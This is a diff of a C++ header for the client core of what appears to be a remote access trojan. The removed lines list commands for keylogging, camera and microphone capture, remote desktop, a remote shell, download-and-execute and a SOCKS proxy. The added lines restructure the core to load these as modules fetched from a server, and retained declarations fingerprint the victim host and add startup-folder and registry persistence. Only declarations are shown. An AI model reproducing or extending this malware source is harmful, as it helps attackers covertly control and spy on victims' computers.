@@ -1,119 +1,61 @@
 #pragma once
 #include "EventHandler.h"
 
-#define KNEL	('K'|('N'<<8)|('E'<<16)|('L'<<24))
-
-/*******************************EVENT ID**************************/
-
-#define KNEL_LOGIN (0xee01)
-//
-#define KNEL_READY			(0x4552)
-
-#define KNEL_POWER_REBOOT	(0xee02)
-#define KNEL_POWER_SHUTDOWN	(0xee03)
-
-#define KNEL_EDITCOMMENT	(0xee04)
-#define KNEL_EDITCOMMENT_OK	(0xee05)
-
-#define KNEL_RESTART		(0xea04)
-
-//获取模块信息....
-#define KNEL_GETMODULE_INFO	(0xea05)
-#define KNEL_MODULE_INFO	(0xea07)
-
-#define KNEL_MODULE_CHUNK_GET	(0xfa00)
-#define KNEL_MODULE_CHUNK_DAT	(0xfa01)
-
-//
-#define KNEL_ERROR			(0xea08)
-
-////
-//#define KNEL_UPLOAD_MODULE_FROMDISK		(0xee08)
-//#define KNEL_UPLOAD_MODULE_FORMURL		(0xee09)
-
-
-
-#define KNEL_CMD						(0xdd01)
-#define KNEL_CHAT						(0xdd02)
-#define KNEL_FILEMGR					(0xdd03)
-#define KNEL_DESKTOP					(0xdd04)
-#define KNEL_CAMERA						(0xdd05)
-#define KNEL_MICROPHONE					(0xdd06)
-#define KNEL_DOWNANDEXEC				(0xdd07)
-#define KNEL_EXIT						(0xdd08)
-#define KNEL_KEYBD_LOG					(0xdd09)
-
-#define KNEL_UTILS_COPYTOSTARTUP		(0xdd0a)
-#define KNEL_UTILS_WRITE_REG			(0xdd0b)
-#define KNEL_UTILS_OPEN_WEBPAGE			(0xdd0d)
-#define KNEL_PROXY_SOCKSPROXY			(0xdd0c)
-#define KNEL_PROCESSMANAGER				(0xdd0e)
+#include "kernel_common.h"
+#include "Module.h"
 
 /*************************************************************************/
 
 #define MAX_MODULE_COUNT 32
 
-typedef void(*ModuleEntry)(CIOCP *Iocp ,char* szServerAddr, unsigned short uPort, LPVOID lpParam);
+typedef void(*typeRun)(LPVOID kernel, const TCHAR * module_name, const TCHAR* module_entry, Params *lpParams);
+
+typedef int (*ModuleEntry)(
+	CIOCP * Iocp,
+	Module * owner,
+	const char* szServerAddr,
+	unsigned short uPort,
+	LPVOID Args[],
+	LPVOID  Kernel,
+	typeRun run_module);
+
+struct PendingTask
+{
+	TCHAR module_name[0x20];
+	TCHAR module_entry[0x20];
+	Params * lpParams;
+};
 
 class CKernel :
 	public CEventHandler
 {
 
-	class Module{
+	class ModuleInfo{
 	public:
-		LPVOID		lpImageBase;
-		ModuleEntry lpEntry;
-		TCHAR		szModuleName[0x40];
+		Module *    module;
+		BYTE        md5sum[0x10];
+		TCHAR		module_name[0x20];
+		TCHAR       install_date[0x20];
 
-		Module() :
-			lpImageBase(0), lpEntry(0)
+		ModuleInfo()
 		{
-			szModuleName[0] = 0;
+			module_name[0] = 0;
+			module = 0;
 		}
 
-		Module(LPVOID ImageBase, ModuleEntry Entry, TCHAR *ModuleName) :
-			lpImageBase(ImageBase),
-			lpEntry(Entry)
+		ModuleInfo(TCHAR *ModuleName)
 		{
-			lstrcpy(szModuleName, ModuleName);
+			module = NULL;
+			lstrcpy(module_name, ModuleName);
 		}
 	};
 
-	typedef struct LoginInfo
-	{
-		TCHAR PrivateIP[128];				//
-		TCHAR HostName[128];
-		TCHAR User[128];
-		TCHAR OsName[128];
-		TCHAR InstallDate[128];
-		TCHAR CPU[128];
-		TCHAR Disk_RAM[128];
-		DWORD dwHasCamera;
-		DWORD dwPing;
-		TCHAR Comment[256];
-	}LoginInfo;
-
-private:
-
 	//Module...
-	Module		m_LoadedModules[MAX_MODULE_COUNT];
-
-	volatile ULONG m_mutex;
-
-	BOOL TryAcquire() { return !InterlockedExchange(&m_mutex,1); };
-	void Release() { InterlockedExchange(&m_mutex, 0); };
+	ModuleInfo		m_LoadedModules[MAX_MODULE_COUNT];
+	volatile ULONG  m_mutex;
 	
-	Module * FindLoadedModule(const TCHAR * ModuleName)
-	{
-		for (int i = 0; i < MAX_MODULE_COUNT; i++)
-		{
-			if (!lstrcmp(m_LoadedModules[i].szModuleName, ModuleName))
-			{
-				return &m_LoadedModules[i];
-			}
-		}
-		return NULL;
-	}
+	//Close event.
+	HANDLE m_hEvent;
 
 	//module upload.....
 	TCHAR   m_CurrentModule[0x40];
@@ -121,68 +63,61 @@ private:
 	DWORD   m_dwLoadedSize;
 	BYTE *  m_ModuleBuffer;
 
+	//
+	PendingTask * m_pendingTask;
+
+public:
+	BOOL TryAcquire() { return !InterlockedExchange(&m_mutex,1); };
+	void Release()    { InterlockedExchange(&m_mutex, 0); };
+	
+	ModuleInfo * FindLoadedModule(const TCHAR * ModuleName)
+	{
+		for (int i = 0; i < MAX_MODULE_COUNT; i++)
+		{
+			if (!lstrcmp(m_LoadedModules[i].module_name, ModuleName))
+			{
+				return &m_LoadedModules[i];
+			}
+		}
+		return NULL;
+	}
+
 	void AddModule(const BYTE * lpData, UINT Size);
 
-
-	//Close event.
-	HANDLE m_hEvent;
-
-	/********************************************************************/
 	UINT16 icmp_checksum(BYTE*buff, int len);
 	DWORD GetPing(const char*host);
-	/********************************************************************/
 	void GetPrivateIP(TCHAR PrivateIP[128]);
-	/********************************************************************/
 	void GetPCName(TCHAR PCName[128]);
-	/********************************************************************/
 	void GetCurrentUser(TCHAR User[128]);
-	/********************************************************************/
 	void GetRAM(TCHAR RAMSize[128]);
-	/********************************************************************/
 	void GetDisk(TCHAR DiskSize[128]);
-	/********************************************************************/
 	void GetOSName(TCHAR OsName[128]);
-	/********************************************************************/
 	void GetCPU(TCHAR CPU[128]);
-	/********************************************************************/
 	DWORD HasCamera();
-	/********************************************************************/
 	void GetComment(TCHAR Comment[256]);
-	/********************************************************************/
 	void GetInstallDate(TCHAR InstallDate[128]);
-	/********************************************************************/
-
 	void GetLoginInfo(LoginInfo*pLoginInfo);
+
+
 	/*********************************************************************/
 	/*					EventHandler									  */
 	/*********************************************************************/
 	void OnReady();
 
 	void OnEditComment(TCHAR NewComment[256]);
+	
+	//session handler.
 	void OnPower_Reboot();
 	void OnPower_Shutdown();
-
-	//void OnUploadModuleFromDisk(DWORD dwRead,char*Buffer);
-
-	//void OnUploadModuleFromUrl(DWORD dwRead,char*Buffer);
-
-	void OnCmd();
-	void OnChat();
-	void OnFileMgr();
-	void OnRemoteDesktop();
-	void OnCamera();
-	void OnMicrophone();
 	void OnRestart();
-	void OnDownloadAndExec(TCHAR*szUrl);
 	void OnExit();
-	void OnKeyboard();
-	void OnSocksProxy();
-	void OnProcessManager();
+	//
+	void OnRunModule(BYTE * lpData, UINT32  Size);
 
 	//模块传输。。。
 	void OnModuleInfo(BYTE* info);
-	void GetModuleChunk();
-	void OnRecvModuleChunk(BYTE* Chunk);
+	void GetModuleData();
+	void OnModuleData(BYTE* lpData);
 
 	void OnUnilsCopyToStartupMenu();
 	void OnUtilsWriteStartupReg();
@@ -194,12 +129,13 @@ private:
 public:
 	void GetModule(const TCHAR* ModuleName);
 
-
 	virtual void OnOpen();
 	virtual void OnClose();
 	virtual void OnEvent(UINT32 e, BYTE* lpData, UINT Size);
+	void    Wait();
 
-	void Wait();
+	static int Run(CKernel * kernel, const TCHAR * module_name, const TCHAR* module_entry, Params* lpParams);
+
 	CKernel(CClient * pClient);
 	~CKernel();
 };
